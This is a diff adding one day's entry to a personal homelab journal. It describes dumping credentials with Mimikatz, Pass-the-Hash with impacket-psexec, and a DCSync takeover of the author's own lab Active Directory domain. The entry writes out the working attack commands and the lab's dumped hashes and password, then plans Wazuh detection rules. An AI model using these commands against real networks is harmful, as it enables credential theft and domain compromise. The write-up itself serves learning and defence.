@@ -353,6 +353,125 @@ Each day gets one entry. Copy the template at the bottom when starting a new day
 - Document the remaining Kerberoasting SPN / AS-REP finding paths in BloodHound too (not just the ACL one) for completeness
 - Eventually: Blue Team phase (Wazuh SIEM) to detect these same attack paths being exploited
 
+
+---
+
+## Day 8 — 2026-11-25: BloodHound `-c All`, LSASS Credential Dumping, Pass-the-Hash & DCSync Domain Takeover
+
+### Goals
+- Enable full BloodHound collection (`-c All`) to detect active user sessions, not just LDAP directory structure.
+- Simulate a realistic lateral movement scenario: a Domain Admin (`acl-test`) signs into the Windows 10 workstation (`10.0.20.10`), and an attacker with local admin access extracts their credentials from memory.
+- Confirm the full end-to-end domain compromise chain via Pass-the-Hash against `DC01` and audit any cross-tier password reuse.
+- Extend the Pass-the-Hash compromise into a full DCSync attack, extracting the `Administrator` (RID 500) NTLM hash directly from the Domain Controller's replication mechanism.
+- Validate the complete kill chain: local workstation compromise → LSASS dump → PtH session injection (`sekurlsa::pth`) → DCSync replication → PtH as built-in Administrator → `NT AUTHORITY\SYSTEM` on DC01.
+
+### What I did
+
+**Unblocking BloodHound `-c All` Collection (SMB/RPC Ports 135 & 445)**
+- Added pfSense rules on ATTACKERS (`OPT2`) for TCP 135 (MSRPC) and 445 (SMB), and enabled Windows Firewall inbound rules (`File and Printer Sharing`, `WMI`) on `DESKTOP-C8VMV6Q` (`DomainAuthenticated` network profile).
+- `nmap -p 135,445 -Pn 10.0.20.10` still reported `filtered` despite verified pfSense rules. Temporarily disabled the Windows Domain Firewall (`Set-NetFirewallProfile -Profile Domain -Enabled False`) to isolate the variable: ports remained `filtered`, proving Windows was not dropping the packets.
+- Ran `sudo tcpdump -i eth1 host 10.0.20.10` on Kali during an Nmap scan: **0 packets captured** — Kali was not routing traffic toward `10.0.20.10` at all.
+- Verified `ip route`: Kali had a static route to `10.0.10.0/24` (SERVERS) via `10.0.30.1`, but **none for `10.0.20.0/24` (USERS)**. Added `sudo ip route add 10.0.20.0/24 via 10.0.30.1 dev eth1`.
+- Confirmed `135/tcp` (`msrpc`) and `445/tcp` (`microsoft-ds`) `open` on `10.0.20.10`, then re-enabled the Windows Domain Firewall (`Set-NetFirewallProfile -Profile Domain -Enabled True`).
+
+**Session Collection & Windows Hardening Boundary**
+- Executed `bloodhound-python -u compte2 -p 'Password1' -d label.local -ns 10.0.10.40 -c All` and uploaded the results to BloodHound CE.
+- Ran the pre-built query *"Domain Admins logons to non-Domain Controllers"* — returned `No results match your criteria`.
+- Isolated collection with `-c Session -v`: observed `DCE/RPC binding: Access denied while enumerating Sessions on DC01.label.local, likely a patched OS`. Modern Windows restricts remote `NetSessionEnum` queries to elevated accounts rather than standard domain users — a real-world OS hardening behavior rather than a lab misconfiguration.
+
+**Simulating Compromised Local Admin & LSASS Credential Dumping**
+- Adjusted the lateral movement scenario realistically: an attacker targeting LSASS already holds local administrative rights on the workstation rather than discovering admin sessions anonymously over SMB.
+- From `acl-test`'s session on the Windows 10 client, added standard user `compte2` to the local Administrators group:
+  ```cmd
+  net localgroup Administrators label.local\compte2 /add
+  ```
+- Staged `mimikatz_trunk.zip` on the Windows 10 client and launched an elevated session as `compte2` (`privilege::debug` → `Privilege '20' OK`).
+- **First extraction attempt (`sekurlsa::logonpasswords`)**: No credentials for `acl-test` appeared in LSASS (only `compte2` and machine account `DESKTOP-C8VMV6Q$`). Root cause: `acl-test` had performed a standard sign-out ("Logout"), which flushes session credentials from LSASS.
+- **Fix & Second extraction**: Signed `acl-test` back in and switched to `compte2` via **"Switch User"** (keeping `acl-test`'s session active in memory). Running `sekurlsa::logonpasswords` successfully extracted `acl-test`'s active logon credentials (`DC01`, SID `S-1-5-21-4102991481-2571678191-3181831677-1110`):
+  - **NTLM Hash**: `64f12cddaa88057e06a81b54e73b949b`
+  - **SHA1**: `cba4e545b7ec918129725154b29f055e4cd5aea8`
+  - `wdigest` and `kerberos` cleartext fields showed `(null)` because modern Windows disables WDigest cleartext caching by default (unlike machine accounts, where Kerberos retains an auto-generated cleartext secret for ticket renewal).
+
+**Password Reuse Discovery**
+- Comparing dumped LSASS hashes revealed that `acl-test` (Domain Admin) and `compte2` (standard user) share the **exact same NTLM hash** (`64f12cddaa88057e06a81b54e73b949b` → `Password1`). Password reuse across privilege tiers is an independent critical vulnerability allowing an attacker who compromises or cracks a standard account to pivot directly into privileged roles.
+
+**End-to-End Domain Compromise via Pass-the-Hash (`impacket-psexec`)**
+- From Kali (`10.0.30.10`), used the dumped NTLM hash of `acl-test` directly against `DC01` (`10.0.10.40`) without ever needing or cracking the cleartext password:
+  ```bash
+  impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b label.local/acl-test@10.0.10.40
+  ```
+- Authenticated over SMB (`ADMIN$` share writable), uploaded the service binary, created/started service `jxwy`, and obtained an interactive shell on `DC01`.
+- Ran `whoami` → **`nt authority\system`**, completing the full attack chain from a single user workstation to `SYSTEM` on the Domain Controller.
+
+**Initial DCSync Attempts (Failed — Wrong Security Context)**
+- Ran `lsadump::dcsync /domain:label.local /user:Administrator@label.local` from the existing Mimikatz session on the Windows 10 client — received `ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x000020f7 (8439)`. DCSync requires domain-controller-level replication rights; the current Mimikatz session was running as `compte2`, a standard local admin, not as a domain admin context.
+- Retried with `/user:acl-test@label.local` — same error, confirming the issue was the security context of the process, not the target account syntax.
+- Attempted DCSync from inside the `impacket-psexec` SYSTEM shell on DC01 by typing `lsadump::dcsync` directly — PowerShell does not interpret Mimikatz commands natively (returned `CommandNotFoundException`).
+
+**Pass-the-Hash Session Injection via `sekurlsa::pth`**
+- From the Mimikatz session running as `compte2` (local admin on Windows 10 client), injected `acl-test`'s NTLM hash to spawn a new PowerShell process inheriting `acl-test`'s domain identity, without needing the cleartext password:
+  ```
+  sekurlsa::pth /user:acl-test /domain:label.local /ntlm:64f12cddaa88057e06a81b54e73b949b /run:powershell.exe
+  ```
+- **First attempt failed**: `ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)` — Mimikatz did not have LSASS read access because `privilege::debug` had not been run first.
+- **Second attempt** (after `privilege::debug` → `Privilege '20' OK`): `sekurlsa::pth` succeeded. Output confirmed LUID injection, LSA process set to R/W, and spawned `powershell.exe` (PID 8404) with `acl-test`'s security token. A new elevated PowerShell window opened at `C:\Windows\System32`.
+
+**DCSync from Injected `acl-test` Context**
+- In the new PowerShell window (identity: `acl-test` / Domain Admin), attempted `lsadump::dcsync /domain:label.local /user:Administrator` — PowerShell does not know this command (it is a Mimikatz internal command).
+- Attempted `.\mimikatz.exe` from the default CWD (`C:\Windows\System32`) — not found, because Mimikatz lives in `C:\Users\compte2\Desktop\mimikatz_trunk\x64\`.
+- Navigated to the correct directory and launched `.\mimikatz.exe`:
+  ```powershell
+  cd C:\Users\compte2\Desktop\mimikatz_trunk\x64
+  .\mimikatz.exe
+  ```
+- Executed DCSync targeting the built-in `Administrator` account (RID 500):
+  ```
+  lsadump::dcsync /domain:label.local /user:Administrator
+  ```
+- **DCSync succeeded**. Mimikatz replicated the `Administrator` account's secrets directly from DC01 via LDAP/DRSR (Directory Replication Service Remote Protocol):
+  - **NTLM Hash**: `a2345375a47a92754e2505132aca194b`
+  - **AES-256**: `b133cf22f5a4a7eebfc672afab6e03450fa22043fc53990647b2aa44829fdafc`
+  - **AES-128**: `285d702ac2f1a6112f8d28bd07c243a8`
+  - **RID**: 500 (built-in Administrator)
+  - **SID**: `S-1-5-21-4102991481-2571678191-3181831677-500`
+
+**Final Domain Takeover — Pass-the-Hash as Administrator**
+- From Kali (`10.0.30.10`), used the harvested `Administrator` NTLM hash against DC01 (`10.0.10.40`):
+  ```bash
+  impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:a2345375a47a92754e2505132aca194b label.local/Administrator@10.0.10.40
+  ```
+- Impacket found writable share `ADMIN$`, uploaded service binary `TurmKUkx.exe`, opened SVCManager, created and started service `zUXs`, and delivered an interactive shell on DC01 as `NT AUTHORITY\SYSTEM`.
+- **Full domain compromise confirmed** using the built-in `Administrator` account — no password ever cracked, no interactive GUI logon required.
+
+### Problems & fixes
+- `135/445` persistently `filtered` on `10.0.20.10` despite verified pfSense rules and disabled Windows Firewall → missing static route for `10.0.20.0/24` on Kali, diagnosed with `tcpdump` (`0 packets captured`) and resolved via `ip route add 10.0.20.0/24 via 10.0.30.1 dev eth1`.
+- BloodHound `-c All` / `-c Session` returned no `HasSession` edges → `NetSessionEnum` restricted by modern Windows hardening (`Access denied... likely a patched OS`); pivoted to simulating pre-existing local admin compromise on the client.
+- First Mimikatz dump showed no Domain Admin credentials → `acl-test` had signed out (clearing LSASS); fixed by keeping the session alive via "Switch User".
+- `psexec.py` returned `command not found` on Kali → used the packaged `impacket-psexec` binary.
+- `lsadump::dcsync` → `ERROR 0x000020f7` from `compte2` context: DCSync is a domain-replication privilege; it requires running as a domain admin. Solution: inject `acl-test`'s NTLM hash via `sekurlsa::pth` to spawn a process under its identity.
+- `sekurlsa::pth` → `Handle on memory (0x00000005)`: LSASS handle requires `privilege::debug` first. Added `privilege::debug` → `Privilege '20' OK` before the pth command.
+- Injected PowerShell couldn't find `mimikatz.exe` via `.\mimikatz.exe` from `C:\Windows\System32`: the working directory after `sekurlsa::pth` defaults to `System32`. Fixed by navigating to the mimikatz folder with the full path before launching.
+- Mimikatz commands (`lsadump::dcsync`) typed directly into PowerShell returned `CommandNotFoundException`: Mimikatz commands are internal to its own interpreter, not PowerShell cmdlets. Must launch `mimikatz.exe` explicitly and run commands within its shell.
+
+### What I learned
+- `-c DCOnly` gathers LDAP directory topology only, whereas `-c All` additionally queries hosts live over SMB/RPC for active sessions (`HasSession`) and local admin memberships.
+- Windows restricts remote `NetSessionEnum` to elevated accounts on patched systems — an important real-world defensive hurdle that makes local host compromise a prerequisite before discovering or harvesting higher-tier sessions.
+- LSASS retains active logon material (NTLM hashes, SHA1, and legacy providers where enabled); logging out wipes those secrets from memory, while "Switch User" leaves them resident and harvestable.
+- Password reuse across privilege boundaries (standard user sharing credentials with a Domain Admin) shortcuts lateral movement completely.
+- Pass-the-Hash (`impacket-psexec -hashes ...`) demonstrates why NTLM hashes are **password equivalents** in Active Directory — cracking cleartext is completely unnecessary once an NTLM hash for a Tier 0 account is recovered from a Tier 2 workstation.
+- **DCSync** does not require physical access to the DC or any exploit — it abuses the legitimate AD replication protocol (DRSR/MS-DRSR) to request any account's secrets via LDAP. Any account with `Replicating Directory Changes` + `Replicating Directory Changes All` permissions (usually only Domain Admins, Domain Controllers, and Azure AD Connectors) can perform it.
+- **`sekurlsa::pth`** (Pass-the-Hash via token injection) spawns a child process inheriting an NTLM-authenticated identity without knowing the cleartext password. The process appears to Windows as that user for all network authentication purposes.
+- The two-step chain `sekurlsa::pth` → DCSync is a critical escalation path: once a Domain Admin hash is extracted from LSASS, it can be used to replicate any account including the built-in `Administrator` (RID 500), making the compromise permanent and independent of password changes on other domain user accounts.
+- DCSync with the `Administrator` (RID 500) NTLM hash provides a backdoor that persists even if other compromised accounts (`acl-test`) have their passwords changed, because RID 500 cannot be disabled.
+- `privilege::debug` is always required before any `sekurlsa::*` Mimikatz commands that interact with LSASS memory — the error `0x00000005` (Access Denied) is the tell-tale sign it was skipped.
+
+### Next
+- Begin the **Blue Team phase (Wazuh SIEM)**: deploy Wazuh Manager on a dedicated VM and agents on DC01 and the Windows 10 client. Configure detection rules for:
+  - **Event ID 4662** (`Replicating Directory Changes All` GUID accessed by non-DC account) → DCSync detection
+  - **Event ID 4624 / 4648** (Logon Type 3 / network NTLM from attacker subnet)
+  - **Event ID 7045 / 4697** (service creation by `impacket-psexec`)
+  - **Sysmon Event ID 10** (LSASS process access by non-system processes)
+  - **Event ID 4728 / 4732** (privileged group membership changes)
 ---
 
 ## Template for new entries
